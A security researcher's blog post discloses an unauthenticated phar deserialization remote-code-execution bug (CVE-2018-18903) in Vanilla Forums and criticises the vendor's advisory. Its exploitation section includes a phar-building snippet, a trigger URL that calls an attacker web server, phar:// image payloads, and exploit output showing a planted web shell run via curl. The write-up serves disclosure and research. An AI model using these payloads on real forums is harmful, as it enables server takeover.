---
layout: post
title: "Old School Pwning with New School Tricks :: Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability"
date: 2018-10-02 10:00:00 -0500
categories: blog
---

![Vanilla Forums](/assets/images/old-school-pwning-with-new-school-tricks/vanilla-forums.png "Vanilla Forums") 

Since I have been working on bug bounties for a while, I decided to finally take the dive into some vendor specific bounties recently. Some of these are on [HackerOne](https://hackerone.com/vanilla) and for me, this is a huge leap of faith because I am a bit of an old schooler in that I remember a time when security researchers couldn't trust vendors, especially for judging impact and providing actionable information for their users to patch. After *my* experience with [Vanilla](https://vanillaforums.com/), sadly, my stance is still the same. You simply cannot trust a vendor to provide actionable and accurate information.
<!--more-->

TL;DR; I walk through the discovery and exploitation of [CVE-2018-18903](/advisories/src-2018-0030) which is an unauthenticated deserialization vulnerability that can be leveraged for remote code execution. Vanilla provided no CVE and stated this report was resolved without providing a commit hash. Later on, I found out that their [changelog](https://open.vanillaforums.com/discussion/36771/security-update-vanilla-2-6-4) incorrectly states the impact of the vulnerability, provides users absolutely no risk rating and does not credit researchers. Shame!

![A poor advisory by Vanilla](/assets/images/old-school-pwning-with-new-school-tricks/poor-vanilla-advisory.png "A poor advisory by Vanilla") 

### Introduction

Vanilla forums is available via their git [repo](https://github.com/vanilla/vanilla) so I simply git cloned the repo and did a `composer install` whilst on the latest Ubuntu server at the time. When browsing Vanilla's [about page](https://vanillaforums.com/en/about-us/) I noticed an interesting statement:

> ...With so many sites competing for attention, a successful community must be engaging and reward member participation. Vanilla provides a modern community platform to organizations who want to improve customer service, increase advocacy, and strengthen brand loyalty...

Let's talk about customer service...

### Discovering the Vulnerability

After a few days of auditing the source code, I found an interesting function in the `DashboardController` controller in `library/core/functions.general.php` file that was reachable by unauthenticated attackers:

```php
class ImportController extends DashboardController {

    ...

    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {      // 0
        $pageInfo = [
            'Url' => $url,
            'Title' => '',
            'Description' => '',
            'Images' => [],
            'Exception' => false
        ];

        try {

            ...

            $request = new ProxyRequest();
            $pageHtml = $request->request([
                'URL' => $url,
                'Timeout' => $timeout,
                'Cookies' => $sendCookies,
                'Redirects' => true,
            ]);                                                                                    // 1

            if (!$request->status()) {
                throw new Exception('Couldn\'t connect to host.', 400);
            }

            $dom = pQuery::parseStr($pageHtml);                                                    // 2
            if (!$dom) {
                throw new Exception('Failed to load page for parsing.');
            }

            ...

            // Page Images
            if (count($pageInfo['Images']) == 0) {
                $images = domGetImages($dom, $url);                                                // 3
                $pageInfo['Images'] = array_values($images);
            }
```

At *[0]* we enter the function via a crafted GET request and then at *[1]* we can trigger an SSRF using an attacker controlled `$url` variable parsed into the `fetchPageInfo` function. This on it's own is an interesting finding and I reported it; only later to be closed as a duplicate. But of course, that isn't patched.

Later at *[2]* the code parses the page response using the `pQuery` class into the `dom` variable.

Finally, in this function at *[3]* the code calls the `domGetImages` function with our `$url` and `$dom` which is a 2d array containing the response from our web server. Continuing inside of the `library/core/functions.general.php` file we can see the following code:

```php
    function domGetImages($dom, $url, $maxImages = 4) {
        $images = [];
        foreach ($dom->query('img') as $element) {                                      // 4
            $images[] = [
                'Src' => absoluteSource($element->attr('src'), $url),                   // 5
                'Width' => $element->attr('width'),
                'Height' => $element->attr('height'),
            ];
        }

        ...
```

At *[4]* the code looks for a html `<img>` tag within the `dom` variable and at *[5]* it will set the `$images` 2d array with the attackers controlled `src` attribute by calling the `absoluteSource` function. Let's check that function for clarification:

```php
   function absoluteSource($srcPath, $url) {
        // If there is a scheme in the srcpath already, just return it.
        if (!is_null(parse_url($srcPath, PHP_URL_SCHEME))) {                    // 6
            return $srcPath;                                                    // 7
        }

    ...

    }
```

At *[6]* the code parses the attacker controlled `srcPath` using `parse_url` and then at *[7]* the code returns the `$srcPath` if the scheme isn't empty. Now back in the `domGetImages` function, we see:

```php
    function domGetImages($dom, $url, $maxImages = 4) {

        ...

        // Sort by size, biggest one first
        $imageSort = [];
        // Only look at first 4 images (speed!)
        $i = 0;
        foreach ($images as $imageInfo) {
            $image = $imageInfo['Src'];                                                 // 8

            if (strpos($image, 'doubleclick.') != false) {
                continue;
            }

            try {
                if ($imageInfo['Height'] && $imageInfo['Width']) {
                    $height = $imageInfo['Height'];
                    $width = $imageInfo['Width'];
                } else {
                    list($width, $height) = getimagesize($image);                       // 9
                }
```

A loop is happening over all the possible images and at *[8]* the code is extracting the src value from the 2d array and setting the `image` variable. Finally at *[9]* if no height or width properties are set in the `<img>` tag, then the code will attempt a `getimagesize` on the fully controlled path.

This can result in remote code execution.

### Exploitation

Some time ago, long before a [blackhat](https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf) paper was written by [Sam Thomas](https://twitter.com/@_s_n_t), [@orange_8361](https://twitter.com/orange_8361) [shared](https://rdot.org/forum/showthread.php?t=4379) a technique for triggering deserialization within a phar archive.

I am not going to deep dive into phar or how the technique works because its been explained well by [others](https://blog.ripstech.com/2018/new-php-exploitation-technique/). But essentially, we can set the metadata of a phar archive with an non-instantiated class.

```php
$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('...');

// add our object as meta data
$phar->setMetadata(new Gdn_Configuration());
$phar->stopBuffering();

// we rename it now
rename("poc.phar", "poc.jpg");
```

Now, to trigger the bug, we just need to do:

`http://target/index.php?p=/dashboard/utility/fetchPageInfo/http:%2f%2f[attacker-web-server]:9090%2f`

The URL encoding is important for exploitation. Now the attackers web server responds with:

```html
<html><body><img src="phar:///var/www/html/uploads/6O51ZT69P0S4.jpg">a</img></body></html>
```

Or, if you exploiting this vulnerability on Windows, you can do:

```html
<html><body><img src="phar:////attacker/share/test.phar">a</img></body></html>
```

The exploit I sent to Vanilla uses their own code to upload the image and leak the filename, which was an admin level authenticated feature. Whilst the attack complexity is high it certainly doesn't mean that this bug is authenticated! Here is the output of my exploit.

```
saturn:~ mr_me$ ./poc.py 172.16.175.143 admin:admin123 172.16.175.1
(+) targeting: http://172.16.175.143
(+) logged in!
(+) uploaded phar!
(+) leaked phar name 6O51ZT69P0S4.jpg!
(+) starting http server...
(!) triggered callback for phar!
(+) triggered a write!
(+) shell at: http://172.16.175.143/?c=phpinfo();

saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### The patch

The [patch](https://github.com/vanilla/vanilla/commit/7e931112fb31da12e1566f6aa82c3f57cd3e8bcc) is interesting because the developer has also included their test cases against the vulnerable function. So maybe someone can develop their own test cases and bypass the patch!

```php
        $r = [
            'root' => ['/foo', 'http://ex.com/bar', 'http://ex.com/foo'],
            'relative' => ['bar', 'http://ex.com/foo', 'http://ex.com/foo/bar'],
            'relative slash' => ['bar', 'http://ex.com/foo/', 'http://ex.com/foo/bar'],
            'scheme' => ['https://ex.com', 'http://ex.com', 'https://ex.com'],
            'schema-less' => ['//ex.com', 'https://baz.com', 'https://ex.com'],
            'bad scheme' => ['bad://ex.com', 'http://ex.com', ''],
            'bad scheme 2' => ['foo', 'bad://ex.com', ''],
            '..' => ['../foo', 'http://ex.com/bar/baz', 'http://ex.com/bar/foo'],
            '.. 2' => ['../foo', 'http://ex.com/bar/baz/', 'http://ex.com/bar/foo'],
            '../..' => ['../../foo', 'http://ex.com/bar/baz', 'http://ex.com/foo'],
        ];
```

Also, I might add that the comment message is nice:

![No mention of security fixes in the commit message](/assets/images/old-school-pwning-with-new-school-tricks/commit-message-vanilla.png "No mention of security fixes in the commit message") 

This certainly doesn't describe what the real issue is now does it?

### Conclusion

Over the years I have learned that it's pretty important to stay independent when reporting vulnerabilities. There are sometimes cases such as these when the vendor either obscures, hides or plain right lies about the details and this type of behavior typically happens on bug bounty platforms where the vendors are favored.

Please note though, I clearly distinguish between product oriented and service oriented bug bounties. There is no way that users of a website or service need to be notified of technical details related to security issues as the code is not impacting them directly. They should only ever be notified if a breach has taken place and their IP has been released to third parties inadvertently as a result of that breach.

### References

- [https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf](https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
- [https://blog.ripstech.com/2018/new-php-exploitation-technique/](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
- [https://rdot.org/forum/showthread.php?t=4379](https://rdot.org/forum/showthread.php?t=4379)
